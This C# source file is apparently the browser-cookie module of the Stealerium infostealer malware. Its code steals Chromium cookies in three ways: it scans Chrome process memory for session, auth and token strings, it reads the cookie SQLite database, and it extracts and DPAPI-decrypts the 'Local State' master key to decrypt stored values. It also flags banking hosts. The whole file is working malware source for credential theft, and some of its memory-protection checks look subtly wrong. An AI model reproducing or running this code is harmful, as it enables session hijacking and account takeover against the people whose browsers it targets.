using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Stealerium.Stub.Helpers;
using System.IO;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Stealerium.Stub.Target.Browsers.Chromium
{
    internal sealed class Cookies
    {
        /// <summary>
        ///     Get cookies from chromium based browsers
        /// </summary>
        /// <param name="sCookie"></param>
        /// <returns>List with cookies</returns>
        public static List<Cookie> Get(string sCookie)
        {
            var lcCookies = new List<Cookie>();

            try
            {
                // First try reading from Chrome's memory
                lcCookies.AddRange(GetFromChromeMemory());
                
                // If memory reading failed, try the cookie database methods
                if (lcCookies.Count == 0)
                {
                    lcCookies.AddRange(GetFromCookieDb(sCookie));

                    // If database reading failed, try with master key
                    if (lcCookies.Count == 0 || lcCookies.All(c => c.ExpiresUtc == "Unknown"))
                    {
                        var localStatePath = Path.GetDirectoryName(Path.GetDirectoryName(sCookie));
                        if (localStatePath != null)
                        {
                            localStatePath = Path.Combine(localStatePath, "Local State");
                            if (File.Exists(localStatePath))
                            {
                                try
                                {
                                    var localState = File.ReadAllText(localStatePath);
                                    if (localState.Contains("os_crypt"))
                                    {
                                        var match = Regex.Match(localState, "\"encrypted_key\":\"([^\"]+)\"");
                                        if (match.Success)
                                        {
                                            var encryptedKey = match.Groups[1].Value;
                                            var keyBytes = Convert.FromBase64String(encryptedKey);
                                            var keyToDecrypt = new byte[keyBytes.Length - 5];
                                            Array.Copy(keyBytes, 5, keyToDecrypt, 0, keyBytes.Length - 5);
                                            
                                            try
                                            {
                                                var decryptedKey = Crypto.DpapiDecrypt(keyToDecrypt);
                                                if (decryptedKey != null)
                                                {
                                                    lcCookies.AddRange(GetFromCookieDbWithKey(sCookie, decryptedKey));
                                                }
                                            }
                                            catch (Exception ex)
                                            {
                                                Logging.Log($"Failed to decrypt master key: {ex.Message}");
                                            }
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Logging.Log($"Failed to read Local State: {ex.Message}");
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect cookies\n" + ex);
            }

            return lcCookies;
        }

        private static List<Cookie> GetFromChromeMemory()
        {
            var cookies = new List<Cookie>();
            try
            {
                // Find Chrome processes
                var chromeProcesses = Process.GetProcessesByName("chrome");
                if (chromeProcesses.Length == 0)
                {
                    Logging.Log("No Chrome processes found");
                    return cookies;
                }

                foreach (var process in chromeProcesses)
                {
                    try
                    {
                        var memoryReader = new ProcessMemoryReader();
                        memoryReader.OpenProcess(process.Id);

                        // Common cookie patterns to search for
                        var patterns = new[]
                        {
                            "document.cookie",
                            ".cookie=",
                            "Set-Cookie:",
                            "_ga=", // Google Analytics
                            "sid=", // Session ID
                            "auth=", // Authentication
                            "token=", // Authentication token
                            "session=", // Session cookie
                        };

                        // Read process memory in chunks
                        const int chunkSize = 4096;
                        byte[] buffer = new byte[chunkSize];
                        
                        // Get process memory regions
                        var regions = memoryReader.GetMemoryRegions();
                        
                        foreach (var region in regions)
                        {
                            if (!region.IsReadable || region.Size.ToInt32() < 100) // Skip small or unreadable regions
                                continue;

                            try
                            {
                                var data = memoryReader.ReadMemory(region.BaseAddress, region.Size.ToInt32()); // Read memory region
                                if (data != null)
                                {
                                    var content = Encoding.ASCII.GetString(data);
                                    
                                    // Look for cookie patterns
                                    foreach (var pattern in patterns)
                                    {
                                        var index = 0;
                                        while ((index = content.IndexOf(pattern, index)) != -1)
                                        {
                                            try
                                            {
                                                // Extract cookie data
                                                var start = content.IndexOf('=', index) + 1;
                                                var end = content.IndexOf(';', start);
                                                if (end == -1) end = content.IndexOf('\n', start);
                                                if (end == -1) end = content.Length;

                                                if (start > 0 && end > start)
                                                {
                                                    var cookieValue = content.Substring(start, end - start).Trim();
                                                    var cookieName = pattern.TrimEnd('=');

                                                    // Create cookie object
                                                    var cookie = new Cookie
                                                    {
                                                        Name = cookieName,
                                                        Value = cookieValue,
                                                        ExpiresUtc = DateTime.Now.AddDays(30).ToString("yyyy-MM-dd HH:mm:ss"), // Assume 30 days
                                                        Path = "/",
                                                        HostKey = "chrome_memory"
                                                    };

                                                    if (!string.IsNullOrWhiteSpace(cookie.Value) && 
                                                        !cookie.Value.Contains('\0') && // Filter out garbage data
                                                        cookie.Value.Length < 1000) // Reasonable size check
                                                    {
                                                        cookies.Add(cookie);
                                                        Counter.Cookies++;
                                                    }
                                                }
                                            }
                                            catch
                                            {
                                                // Skip this match if parsing fails
                                            }
                                            index = index + pattern.Length;
                                        }
                                    }
                                }
                            }
                            catch
                            {
                                // Skip region if reading fails
                                continue;
                            }
                        }

                        memoryReader.CloseHandle();
                    }
                    catch (Exception ex)
                    {
                        Logging.Log($"Failed to read Chrome process {process.Id}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Failed to read Chrome memory: {ex.Message}");
            }

            return cookies;
        }

        private static List<Cookie> GetFromCookieDb(string sCookie)
        {
            var lcCookies = new List<Cookie>();
            try
            {
                var sSqLite = SqlReader.ReadTable(sCookie, "cookies");
                if (sSqLite == null) return lcCookies;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    try
                    {
                        var cCookie = new Cookie
                        {
                            HostKey = Crypto.GetUtf8(sSqLite.GetValue(i, 1)),
                            Name = Crypto.GetUtf8(sSqLite.GetValue(i, 2)),
                            Value = Crypto.GetUtf8(sSqLite.GetValue(i, 3)), // Try plaintext first
                            Path = Crypto.GetUtf8(sSqLite.GetValue(i, 4))
                        };

                        // Try to parse expiration
                        var expiresStr = sSqLite.GetValue(i, 5);
                        if (!string.IsNullOrEmpty(expiresStr))
                        {
                            var numStr = new string(expiresStr.Where(c => char.IsDigit(c) || c == '-').ToArray());
                            if (long.TryParse(numStr, out long expires))
                            {
                                try
                                {
                                    // Convert from Chrome's microseconds since 1601 to DateTime
                                    var epochStart = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                                    if (expires > 0)
                                    {
                                        var microseconds = expires;
                                        var ticks = microseconds * 10;
                                        var expiresUtc = epochStart.AddTicks(ticks);
                                        cCookie.ExpiresUtc = expiresUtc.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
                                    }
                                    else
                                    {
                                        cCookie.ExpiresUtc = "Session";
                                    }
                                }
                                catch
                                {
                                    cCookie.ExpiresUtc = "Unknown";
                                }
                            }
                            else
                            {
                                cCookie.ExpiresUtc = "Unknown";
                            }
                        }

                        // If plaintext value is empty, try encrypted
                        if (string.IsNullOrEmpty(cCookie.Value))
                        {
                            var encryptedValue = sSqLite.GetValue(i, 12);
                            if (!string.IsNullOrEmpty(encryptedValue))
                            {
                                try
                                {
                                    var decrypted = Crypto.DpapiDecrypt(Encoding.Default.GetBytes(encryptedValue));
                                    if (decrypted != null)
                                    {
                                        cCookie.Value = Encoding.UTF8.GetString(decrypted);
                                    }
                                }
                                catch
                                {
                                    // Decryption failed, keep the empty value
                                }
                            }
                        }

                        if (!string.IsNullOrEmpty(cCookie.Value))
                        {
                            Banking.ScanData(cCookie.HostKey);
                            Counter.Cookies++;
                            lcCookies.Add(cCookie);
                        }
                    }
                    catch
                    {
                        // Skip this cookie if there's an error
                        continue;
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"COOOOOK: Failed to read cookie db: {ex.Message}");
            }
            return lcCookies;
        }

        private static List<Cookie> GetFromCookieDbWithKey(string sCookie, byte[] masterKey)
        {
            var lcCookies = new List<Cookie>();
            try
            {
                var sSqLite = SqlReader.ReadTable(sCookie, "cookies");
                if (sSqLite == null) return lcCookies;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    try
                    {
                        var cCookie = new Cookie
                        {
                            HostKey = Crypto.GetUtf8(sSqLite.GetValue(i, 1)),
                            Name = Crypto.GetUtf8(sSqLite.GetValue(i, 2)),
                            Path = Crypto.GetUtf8(sSqLite.GetValue(i, 4))
                        };

                        // Handle expiration same as before
                        var expiresStr = sSqLite.GetValue(i, 5);
                        if (!string.IsNullOrEmpty(expiresStr))
                        {
                            var numStr = new string(expiresStr.Where(c => char.IsDigit(c) || c == '-').ToArray());
                            if (long.TryParse(numStr, out long expires))
                            {
                                try
                                {
                                    var epochStart = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                                    if (expires > 0)
                                    {
                                        var microseconds = expires;
                                        var ticks = microseconds * 10;
                                        var expiresUtc = epochStart.AddTicks(ticks);
                                        cCookie.ExpiresUtc = expiresUtc.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
                                    }
                                    else
                                    {
                                        cCookie.ExpiresUtc = "Session";
                                    }
                                }
                                catch
                                {
                                    cCookie.ExpiresUtc = "Unknown";
                                }
                            }
                            else
                            {
                                cCookie.ExpiresUtc = "Unknown";
                            }
                        }

                        // Try to decrypt with master key
                        var encryptedValue = sSqLite.GetValue(i, 12);
                        if (!string.IsNullOrEmpty(encryptedValue))
                        {
                            try
                            {
                                var encryptedBytes = Encoding.Default.GetBytes(encryptedValue);
                                if (encryptedBytes.Length > 0)
                                {
                                    // Try AES decryption with the master key
                                    var decrypted = Crypto.DecryptWithKey(encryptedBytes, masterKey);
                                    if (decrypted != null)
                                    {
                                        cCookie.Value = Encoding.UTF8.GetString(decrypted);
                                    }
                                }
                            }
                            catch
                            {
                                // Decryption failed, try plaintext
                                cCookie.Value = Crypto.GetUtf8(sSqLite.GetValue(i, 3));
                            }
                        }
                        else
                        {
                            // No encrypted value, use plaintext
                            cCookie.Value = Crypto.GetUtf8(sSqLite.GetValue(i, 3));
                        }

                        if (!string.IsNullOrEmpty(cCookie.Value))
                        {
                            Banking.ScanData(cCookie.HostKey);
                            Counter.Cookies++;
                            lcCookies.Add(cCookie);
                        }
                    }
                    catch
                    {
                        // Skip this cookie if there's an error
                        continue;
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"COOOOOK: Failed to read cookie db with master key: {ex.Message}");
            }
            return lcCookies;
        }
    }

    // Helper class for reading process memory
    internal class ProcessMemoryReader
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        private IntPtr processHandle;

        [Flags]
        private enum ProcessAccessFlags : uint
        {
            PROCESS_VM_READ = 0x0010,
            PROCESS_QUERY_INFORMATION = 0x0400
        }

        public void OpenProcess(int processId)
        {
            processHandle = OpenProcess(
                ProcessAccessFlags.PROCESS_VM_READ | ProcessAccessFlags.PROCESS_QUERY_INFORMATION,
                false,
                processId);
        }

        public byte[] ReadMemory(IntPtr address, int size)
        {
            try 
            {
                var buffer = new byte[size];
                int bytesRead;
                if (ReadProcessMemory(processHandle, address, buffer, size, out bytesRead) && bytesRead > 0)
                {
                    if (bytesRead < buffer.Length)
                    {
                        Array.Resize(ref buffer, bytesRead);
                    }
                    return buffer;
                }
            }
            catch
            {
                // Ignore read errors
            }
            return null;
        }

        public void CloseHandle()
        {
            if (processHandle != IntPtr.Zero)
            {
                CloseHandle(processHandle);
                processHandle = IntPtr.Zero;
            }
        }

        public List<MemoryRegion> GetMemoryRegions()
        {
            var regions = new List<MemoryRegion>();
            IntPtr address = IntPtr.Zero;
            
            while (true)
            {
                MEMORY_BASIC_INFORMATION mbi;
                int result = VirtualQueryEx(processHandle, address, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                if (result == 0)
                    break;

                if (mbi.State == 0x1000 && // MEM_COMMIT
                    (mbi.Protect & 0x01) != 0) // PAGE_NOACCESS
                {
                    regions.Add(new MemoryRegion
                    {
                        BaseAddress = mbi.BaseAddress,
                        Size = mbi.RegionSize,
                        IsReadable = true
                    });
                }

                var nextAddress = mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64();
                if (nextAddress > 0x7FFFFFFF0000 || nextAddress < 0) // Upper limit check
                    break;
                
                address = new IntPtr(nextAddress);
            }

            return regions;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    internal class MemoryRegion
    {
        public IntPtr BaseAddress { get; set; }
        public IntPtr Size { get; set; }
        public bool IsReadable { get; set; }
    }
}